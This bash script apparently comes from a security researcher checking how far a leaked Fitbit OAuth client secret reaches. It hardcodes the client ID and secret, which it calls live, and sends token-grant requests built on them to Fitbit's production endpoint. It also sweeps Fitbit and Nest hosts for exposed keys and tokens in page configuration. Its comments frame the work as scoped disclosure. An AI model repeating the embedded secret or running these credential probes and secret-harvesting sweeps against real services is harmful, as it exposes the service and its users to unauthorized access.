#!/data/data/com.termux/files/usr/bin/bash
# g-probe4.sh — bound the impact of the live Fitbit client secret, and find out
# whether it is one mistake or a pattern.
#
# What is PROVEN so far: the secret authenticates. Nothing more.
# What is NOT proven: that it yields a token, or reaches any user's data.
# This script answers only the questions it can answer without touching a user.
set -u
T="$HOME/.gprobe"; mkdir -p "$T"
ID=227ZG3; SEC=458dd4f32a9db4957cf15fd464be196d
B=$(printf '%s:%s' "$ID" "$SEC" | base64 -w0 2>/dev/null || printf '%s:%s' "$ID" "$SEC" | base64)

echo "######################################################################"
echo "# 1. Is client authentication genuinely REQUIRED on this endpoint?   #"
echo "######################################################################"
echo "  If the endpoint accepts the request with no credentials at all, then the"
echo "  32-hex string is decoration and there is no finding. This is the control"
echo "  that has to pass before anything else means anything."
printf '  [no auth header at all]        '
curl -s --max-time 12 -X POST https://api.fitbit.com/oauth2/token \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'grant_type=authorization_code&code=ZZZINVALIDCODE7x2&redirect_uri=https://example.com/' \
  -w ' [HTTP %{http_code}]\n' | tr -d '\n' | head -c 300; echo
sleep 1.5
printf '  [client_id in body, no secret]  '
curl -s --max-time 12 -X POST https://api.fitbit.com/oauth2/token \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d "grant_type=authorization_code&code=ZZZINVALIDCODE7x2&client_id=$ID&redirect_uri=https://example.com/" \
  -w ' [HTTP %{http_code}]\n' | tr -d '\n' | head -c 300; echo
sleep 1.5

echo
echo "######################################################################"
echo "# 2. What does the secret alone actually BUY? (no user is involved)  #"
echo "######################################################################"
echo "  client_credentials issues an APP-level token from id+secret alone. If Fitbit"
echo "  supports it here, an attacker needs nothing else. If it answers"
echo "  unsupported_grant_type, that is a real limit on the impact and the report"
echo "  must say so rather than imply otherwise."
for g in client_credentials refresh_token; do
  printf '  grant_type=%-20s ' "$g"
  curl -s --max-time 12 -X POST https://api.fitbit.com/oauth2/token \
    -H "Authorization: Basic $B" -H 'Content-Type: application/x-www-form-urlencoded' \
    -d "grant_type=$g&refresh_token=ZZZINVALIDREFRESH7x2" \
    -w ' [HTTP %{http_code}]\n' | tr -d '\n' | head -c 320; echo
  sleep 1.5
done
echo
echo "  NOTE: if client_credentials returns an access_token, DO NOT CALL ANY API"
echo "  WITH IT. The token's existence is the proof. Using it would be using the"
echo "  access, which the rules forbid and which the report does not need."

echo
echo "######################################################################"
echo "# 3. Is this one slip, or the house style? (other Fitbit SPA hosts)  #"
echo "######################################################################"
echo "  Every host below answered 200 in the sweep. Ember and similar frameworks"
echo "  ship runtime config in a meta tag; the question is whether any OTHER host"
echo "  ships a credential the same way."
for h in dev.fitbit.com accounts.fitbit.com hms-integration.fitbit.com gam.fitbit.com \
         strava.fitbit.com snapdragon-ws.fitbit.com simulator-updates.fitbit.com \
         home.nest.com myaccount.nest.com pro.nest.com welcome.nest.com; do
  body=$(curl -s --max-time 10 "https://$h/" 2>/dev/null)
  hits=$(printf '%s' "$body" | grep -ocE '[0-9a-f]{32}' || true)
  cfg=$(printf '%s' "$body" | grep -oE 'content="%7B[^"]{40,}"' | head -1)
  printf '  %-32s 32hex:%-3s config-meta:%s\n' "$h" "${hits:-0}" "$([ -n "$cfg" ] && echo YES || echo no)"
  if [ -n "$cfg" ]; then
    printf '%s' "$cfg" | sed 's/content="//;s/"$//' | python3 -c "
import sys,urllib.parse,re
raw=urllib.parse.unquote(sys.stdin.read())
for m in set(re.findall(r'\"[A-Za-z_]*(?:secret|clientId|client_id|apiKey|token|key)[A-Za-z_]*\"\s*:\s*\"[^\"]{6,}\"',raw,re.I)):
    print('      ',m[:140])" 2>/dev/null
  fi
  sleep 0.8
done
